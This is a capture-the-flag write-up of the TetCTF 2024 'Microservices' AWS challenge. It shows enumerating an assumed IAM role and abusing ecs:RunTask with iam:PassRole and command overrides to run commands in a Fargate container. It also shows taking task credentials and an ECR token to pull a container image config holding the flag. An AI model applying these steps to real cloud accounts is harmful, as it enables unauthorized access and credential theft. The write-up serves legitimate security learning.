
# Microservices

![](https://324136204-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzSO6zKRtEPX2coPJBU8f%2Fuploads%2FCv8nc671EFmgZRD7pcuk%2Fimage.png?alt=media&token=0587acdc-6e27-4d37-967c-2c9d48e1dc34)

From the description, we are given 2 critical information

-   1. UK Fintech, so we can assume that the reigion is eu-west-2 (London)
    

-   2. The role we will need to assume is `arn:aws:iam::543303393859:role/TetCtf2Stack-EcsTaskRole8DFA0181-qubavXABtWiL`
    

----------

Firstly, I assumed the role with the IAM Credentials from the previous challenge as I was lazy in creating my own IAM keys.
```
aws sts assume-role --role-arn arn:aws:iam::543303393859:role/TetCtf2Stack-EcsTaskRole8DFA0181-qubavXABtWiL --role-session-name asd --profile tet
```
![](https://324136204-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzSO6zKRtEPX2coPJBU8f%2Fuploads%2FiToXX3lNKaGIqHHsWz5F%2Fimage.png?alt=media&token=149beeee-3ac3-4f0b-98e8-f3f67c0ef365)

I then run aws configure with the profile assume, and manually appended the session token into the credentials file.

![](https://324136204-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzSO6zKRtEPX2coPJBU8f%2Fuploads%2FRIls57kk4o7EAEp4kqrB%2Fimage.png?alt=media&token=5b1e69ff-29dd-452e-80d1-4d7a6a8469ef)

We are in with the assumed credentials and its working fine with the `sts get-caller-identity`

![](https://324136204-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzSO6zKRtEPX2coPJBU8f%2Fuploads%2F9WTZD775vfDb5iPuBXg1%2Fimage.png?alt=media&token=c27fdd0b-70c0-4ff6-a039-028794a11f6b)

Firstly, I enumerate IAM Permissions that the role have.

aws iam list-role-policies --role-name TetCtf2Stack-EcsTaskRole8DFA0181-qubavXABtWiL --profile assume

![](https://324136204-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzSO6zKRtEPX2coPJBU8f%2Fuploads%2FQBlkzEiWE8mkhSHf1TuK%2Fimage.png?alt=media&token=61c1a648-3f66-4498-9f59-a07d08aeeb18)

Theres the EcsTaskRoleDefaultPolicy attached for the IAM role, and lets look into it.
```
aws iam get-role-policy --role-name TetCtf2Stack-EcsTaskRole8DFA0181-qubavXABtWiL --policy-name EcsTaskRoleDefaultPolicy50882C77 --profile assume
```
```
{
    "RoleName": "TetCtf2Stack-EcsTaskRole8DFA0181-qubavXABtWiL",
    "PolicyName": "EcsTaskRoleDefaultPolicy50882C77",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Action": "ecs:RunTask",
                "Resource": "arn:aws:ecs:eu-west-2:543303393859:task-definition/TetCtf2StackCtfTaskDefB40F186A:3",
                "Effect": "Allow"
            },
            {
                "Action": [
                    "iam:ListRolePolicies",
                    "iam:GetRolePolicy",
                    "ecs:ListClusters",
                    "ec2:DescribeSecurityGroups",
                    "ec2:DescribeSubnets"
                ],
                "Resource": "*",
                "Effect": "Allow"
            },
            {
                "Effect": "Allow",
                "Action": "iam:PassRole",
                "Resource": [
                    "arn:aws:iam::543303393859:role/TetCtf2Stack-EcsExecutionRoleFD93B7A2-O8bY2QagMK25",
                    "arn:aws:iam::543303393859:role/TetCtf2Stack-CtfTaskDefTaskRoleD17F896A-vJxGKfIFhChH"
                ]
            },
            {
                "Sid": "Statement1",
                "Effect": "Allow",
                "Action": [
                    "logs:GetLogEvents",
                    "logs:DescribeLogStreams",
                    "logs:DescribeLogGroups"
                ],
                "Resource": [
                    "arn:aws:logs:eu-west-2:543303393859:*"
                ]
            }
        ]
    }
}
```
Immidiately, a few thing stand out.

-   1. We are able to enumerate ECS, EC2, and able to execute ECS RunTask
    

-   2. We are able to PassRole, which probably has something to do when we execute RunTask
    

-   3. We are able to view cloudwatch logs
    

With that in mind, lets enumerate the ECS and EC2, and view the cloudwatch logs to see if theres any interesting artifacts.
```
aws ecs list-clusters --profile assume
```
![](https://324136204-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzSO6zKRtEPX2coPJBU8f%2Fuploads%2FYo9MAR5JlhDQay8Tkfhb%2Fimage.png?alt=media&token=775a7872-516f-49d6-89ca-15232f0fe264)
```
aws ec2 describe-security-groups --profile assume
```
```
{
    "SecurityGroups": [
        {
            "Description": "Security Group for CTF ECS tasks",
            "GroupName": "TetCtf2Stack-CtfSecurityGroupA7633774-1DAGZMZKB7EY4",
            "IpPermissions": [],
            "OwnerId": "543303393859",
            "GroupId": "sg-0f6583e3532e99a62",
            "IpPermissionsEgress": [
                {
                    "FromPort": 252,
                    "IpProtocol": "icmp",
                    "IpRanges": [
                        {
                            "CidrIp": "255.255.255.255/32",
                            "Description": "Disallow all traffic"
                        }
                    ],
                    "Ipv6Ranges": [],
                    "PrefixListIds": [],
                    "ToPort": 86,
                    "UserIdGroupPairs": []
                }
            ],
            "Tags": [
                {
                    "Key": "aws:cloudformation:stack-name",
                    "Value": "TetCtf2Stack"
                },
                {
                    "Key": "aws:cloudformation:logical-id",
                    "Value": "CtfSecurityGroupA7633774"
                },
                {
                    "Key": "aws:cloudformation:stack-id",
                    "Value": "arn:aws:cloudformation:eu-west-2:543303393859:stack/TetCtf2Stack/54b3d720-bc03-11ee-9235-06cbbf25eaf7"
                }
            ],
            "VpcId": "vpc-07e8cd02a7c992f43"
        },
        {
            "Description": "default VPC security group",
            "GroupName": "default",
            "IpPermissions": [
                {
                    "IpProtocol": "-1",
                    "IpRanges": [],
                    "Ipv6Ranges": [],
                    "PrefixListIds": [],
                    "UserIdGroupPairs": [
                        {
                            "GroupId": "sg-2a62a941",
                            "UserId": "543303393859"
                        }
                    ]
                }
            ],
            "OwnerId": "543303393859",
            "GroupId": "sg-2a62a941",
            "IpPermissionsEgress": [
                {
                    "IpProtocol": "-1",
                    "IpRanges": [
                        {
                            "CidrIp": "0.0.0.0/0"
                        }
                    ],
                    "Ipv6Ranges": [],
                    "PrefixListIds": [],
                    "UserIdGroupPairs": []
                }
            ],
            "VpcId": "vpc-5744993f"
        },
        {
            "Description": "default VPC security group",
            "GroupName": "default",
            "IpPermissions": [],
            "OwnerId": "543303393859",
            "GroupId": "sg-0e0be2c862c2b3241",
            "IpPermissionsEgress": [],
            "VpcId": "vpc-07e8cd02a7c992f43"
        },
        {
            "Description": "GET FLAG",
            "GroupName": "TetCTF-GETFLAG",
            "IpPermissions": [],
            "OwnerId": "543303393859",
            "GroupId": "sg-0636ad23bae6f21e7",
            "IpPermissionsEgress": [
                {
                    "IpProtocol": "-1",
                    "IpRanges": [
                        {
                            "CidrIp": "0.0.0.0/0"
                        }
                    ],
                    "Ipv6Ranges": [],
                    "PrefixListIds": [],
                    "UserIdGroupPairs": []
                }
            ],
            "VpcId": "vpc-07e8cd02a7c992f43"
        }
    ]
}
```
```
aws ec2 describe-subnets --profile assume (output redacted for brevity)
```
What we learned from the command that was ran above.

-   1. The cluster arn is `arn:aws:ecs:eu-west-2:543303393859:cluster/CtfEcsCluster`
    

-   2.  There is a security group called `TetCTF-GETFLAG,`its vpc id is vpc-07e8cd02a7c992f43 and its group id is `sg-0636ad23bae6f21e7`
    
```
aws ec2 describe-subnets --filters  "Name=vpc-id,Values=vpc-07e8cd02a7c992f43"  --profile assume
```
-   3. Filtering based on the vpc-id, there are 4 subnets that we can use
    

Next, lets understand what does ECS Run Task perform.

Based on the AWS Documentation, the RunTask starts a new task using the specified task definition.

Looking at the policy statement, we are able to then craft out the command
```
{
    "Action": "ecs:RunTask",
    "Resource": "arn:aws:ecs:eu-west-2:543303393859:task-definition/TetCtf2StackCtfTaskDefB40F186A:3",
    "Effect": "Allow"
}
```
```
aws ecs run-task --task-definition TetCtf2StackCtfTaskDefB40F186A:3 \

--cluster CtfEcsCluster \

--network-configuration "awsvpcConfiguration={subnets=[subnet-05dc4f12caf437c48],securityGroups=[sg-0636ad23bae6f21e7],assignPublicIp=ENABLED}" \

--launch-type FARGATE --profile assume
```

We are able to see that the command run successfully, and able to get the output from the cloudwatch logs.

![](https://324136204-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzSO6zKRtEPX2coPJBU8f%2Fuploads%2FNhQCOuhD45Qa5mIWbjlc%2Fimage.png?alt=media&token=1a5ed76b-20a9-48cb-9c46-1732149ed5c2)

![](https://324136204-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzSO6zKRtEPX2coPJBU8f%2Fuploads%2FuejS686xtpACN4B2PlxH%2Fimage.png?alt=media&token=a1c01166-b515-4b36-a646-b2b1cabc3fe7)

The output is a set of AWS credentials, being the credentials of the fargate instances

Looking back at the iam policy file, we have the `iam:PassRole` , so we will need to pass the role to the fargate instance
```
{
    "Effect": "Allow",
    "Action": "iam:PassRole",
    "Resource": [
        "arn:aws:iam::543303393859:role/TetCtf2Stack-EcsExecutionRoleFD93B7A2-O8bY2QagMK25",
        "arn:aws:iam::543303393859:role/TetCtf2Stack-CtfTaskDefTaskRoleD17F896A-vJxGKfIFhChH"
    ]
}
```

Based on the AWS Documentations, we are able to use the `-overrides` option to pass the role when spinning up the fargate instances.

![](https://324136204-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzSO6zKRtEPX2coPJBU8f%2Fuploads%2F5Y3KUQLli8xXyhRei7bM%2Fimage.png?alt=media&token=d05a5578-7aca-4fb7-8e4f-7a4a03450c40)

But first, lets take a look at what those two role does.
```
aws iam list-role-policies --role-name TetCtf2Stack-EcsExecutionRoleFD93B7A2-O8bY2QagMK25 --profile assume
```
​
```
aws iam get-role-policy --role-name TetCtf2Stack-EcsExecutionRoleFD93B7A2-O8bY2QagMK25 --policy-name EcsExecutionRoleDefaultPolicy9114F99B --profile assume
```
![](https://324136204-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzSO6zKRtEPX2coPJBU8f%2Fuploads%2FuTESdQjVqQVJK2MMksQI%2Fimage.png?alt=media&token=d241a19b-0a54-454d-a29c-a4acf79f1120)
```
{
    "RoleName": "TetCtf2Stack-EcsExecutionRoleFD93B7A2-O8bY2QagMK25",
    "PolicyName": "EcsExecutionRoleDefaultPolicy9114F99B",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Action": [
                    "ecr:BatchCheckLayerAvailability",
                    "ecr:BatchGetImage",
                    "ecr:GetAuthorizationToken",
                    "ecr:GetDownloadUrlForLayer",
                    "logs:CreateLogStream",
                    "logs:PutLogEvents"
                ],
                "Resource": "*",
                "Effect": "Allow"
            },
            {
                "Action": [
                    "logs:CreateLogStream",
                    "logs:PutLogEvents"
                ],
                "Resource": "arn:aws:logs:eu-west-2:543303393859:log-group:/ecs/tet-ctf:*",
                "Effect": "Allow"
            }
        ]
    }
}
```
![](https://324136204-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzSO6zKRtEPX2coPJBU8f%2Fuploads%2FBcoZ85Yznmu3sS4oRcup%2Fimage.png?alt=media&token=b6cc3236-fde9-47b3-b179-a2dfbd70d43c)

We can see from the policy file that the role has `TetCtf2Stack-EcsExecutionRoleFD93B7A2-O8bY2QagMK25` the permission to enumerate ECR and get the container information. Armed with the relevant information, we can craft our json file. While more research on `run-task` i came accross a interesting [article](https://spin.atomicobject.com/override-database-migration/) showing how you are able to override the command thats being ran via the `--overrides` flag. I also added the script into it to try and get an RCE.
```
{
    "containerOverrides": [
        {
            "command": [
                "ls"
            ],
            "name": "CtfContainer"
        }
    ],
    "executionRoleArn": "arn:aws:iam::543303393859:role/TetCtf2Stack-EcsExecutionRoleFD93B7A2-O8bY2QagMK25",
    "taskRoleArn": "arn:aws:iam::543303393859:role/TetCtf2Stack-CtfTaskDefTaskRoleD17F896A-vJxGKfIFhChH"
}
```
```
aws ecs run-task --task-definition TetCtf2StackCtfTaskDefB40F186A:3 \

--cluster CtfEcsCluster \

--network-configuration "awsvpcConfiguration={subnets=[subnet-05dc4f12caf437c48],securityGroups=[sg-0636ad23bae6f21e7],assignPublicIp=ENABLED}" \

--overrides file://overrides.json \

--launch-type FARGATE --profile assume
```

The command execute succesfully, and we are able to get RCE, which also contains the flag in the root folder.
```
aws logs describe-log-streams --log-group-name /ecs/tet-ctf --profile assume

aws logs get-log-events --log-group-name /ecs/tet-ctf --log-stream-name CtfContainer/CtfContainer/6433c096d8b74339bc83e79baf2ac2ec --profile assume
```
![](https://324136204-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzSO6zKRtEPX2coPJBU8f%2Fuploads%2F89bZFHA5PeqTQa9Y246C%2Fimage.png?alt=media&token=eda8bb62-8775-4f06-9a2d-b7bf83f0f702)

yay i win and get flag.

## 

Alternate Solution[](https://ctf.edwinczd.com/2024/tetctf-2024/microservices#alternate-solution)

However, after the CTF and discussion in the #web channel, securisec shared his solution, which really make much more sense.

![](https://324136204-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzSO6zKRtEPX2coPJBU8f%2Fuploads%2FTMYJsyfICtSyhbTgwUdW%2Fimage.png?alt=media&token=38342623-578c-4a51-8175-0a3915d10905)

![](https://324136204-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzSO6zKRtEPX2coPJBU8f%2Fuploads%2F8vw0kSPE9lCgDUHl73xS%2Fimage.png?alt=media&token=00635463-2ddd-4f23-99e3-3535f6525d49)

![](https://324136204-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzSO6zKRtEPX2coPJBU8f%2Fuploads%2FIDZQvb1FmeyaX5JV2cxP%2Fimage.png?alt=media&token=b8d339e0-95eb-42ff-be8e-3a59073f441b)

So lets try to follow securisec method and get the flag from the ECR instead!

First, i removed the RCE command in my overrides.json, and get the keys from the log stream.
```
{

"executionRoleArn": "arn:aws:iam::543303393859:role/TetCtf2Stack-EcsExecutionRoleFD93B7A2-O8bY2QagMK25",

"taskRoleArn": "arn:aws:iam::543303393859:role/TetCtf2Stack-CtfTaskDefTaskRoleD17F896A-vJxGKfIFhChH"

}
```
![](https://324136204-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzSO6zKRtEPX2coPJBU8f%2Fuploads%2FtSxsZR4HAGsTjrEUqoSp%2Fimage.png?alt=media&token=b7316807-7901-4545-9a85-029456bac84c)

From the RunTask output, we also get the ECR URL.

![](https://324136204-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzSO6zKRtEPX2coPJBU8f%2Fuploads%2FHmKkHsGRcC4tEeTEYz1J%2Fimage.png?alt=media&token=610bd05c-68b3-4774-9fba-c7ea692e4ff3)

Again, a quick sanity check to see if the credentials is working properly.

![](https://324136204-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzSO6zKRtEPX2coPJBU8f%2Fuploads%2F1vJ5AWjW7TdkKWAHaB72%2Fimage.png?alt=media&token=965c91e5-a02a-479a-8a38-f911e2f58020)

​

Quick recap on the relevant permission
```
{
"Action": [
    "ecr:BatchCheckLayerAvailability",
    "ecr:BatchGetImage",
    "ecr:GetAuthorizationToken",
    "ecr:GetDownloadUrlForLayer",
    "logs:CreateLogStream",
    "logs:PutLogEvents"
],
"Resource": "*",
"Effect": "Allow"
}
```
I wrote a quick bash script to authenticate with the token.
```bash
token=$(aws ecr get-authorization-token --profile fargate --output json | jq -r '.authorizationData[0].authorizationToken' | base64 -d | cut -d ":" -f 2)

crane auth login 543303393859.dkr.ecr.eu-west-2.amazonaws.com --username AWS --password $token
```
![](https://324136204-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzSO6zKRtEPX2coPJBU8f%2Fuploads%2FScqZkLOcyE6NMQejF0B0%2Fimage.png?alt=media&token=ed9095eb-5b8f-41f2-af2e-bad344f3f828)

As we already have the image name from the run task output, I tried to get the config of the image, and we get flag!

![](https://324136204-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FzSO6zKRtEPX2coPJBU8f%2Fuploads%2FoK5K7yqPCXXtNTk6O45W%2Fimage.png?alt=media&token=9313344a-ed4a-43db-b81e-d2b802257fa6)

## 

Reference[](https://ctf.edwinczd.com/2024/tetctf-2024/microservices#reference)

​

​[https://docs.aws.amazon.com/cli/latest/reference/ecs/run-task.html](https://docs.aws.amazon.com/cli/latest/reference/ecs/run-task.html)​

​[https://stackoverflow.com/questions/41373167/how-to-run-aws-ecs-task-overriding-environment-variables](https://stackoverflow.com/questions/41373167/how-to-run-aws-ecs-task-overriding-environment-variables)​

​[https://spin.atomicobject.com/override-database-migration/](https://spin.atomicobject.com/override-database-migration/)